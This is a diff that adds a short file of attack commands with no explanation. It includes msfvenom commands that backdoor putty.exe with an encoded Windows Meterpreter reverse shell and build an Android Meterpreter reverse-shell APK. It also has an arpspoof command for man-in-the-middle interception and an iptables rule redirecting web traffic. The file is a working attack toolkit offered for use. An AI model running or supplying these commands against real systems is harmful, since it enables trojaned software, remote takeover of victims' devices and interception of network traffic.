@@ -1,0 +1,9 @@
+msfvenom -a x86 --platform windows -x putty.exe -k -p windows/meterpreter/reverse_tcp lhost=192.168.1.102 lport=3232 -e x86/shikata_ga_nai -i 3 -b "\x00" -f exe -o mate.exe
+
+
+
+iptables -t nat -A PREROUTING -p TCP --destination-port 80 -j REDIRECT --to-port 8080 
+
+arpspoof -i wlp5s0 -t 10.20.32.191 10.20.30.1
+
+msfvenom -p android/meterpreter/reverse_tcp LHOST=Your_IP LPORT=Your_Port R > payload.apk
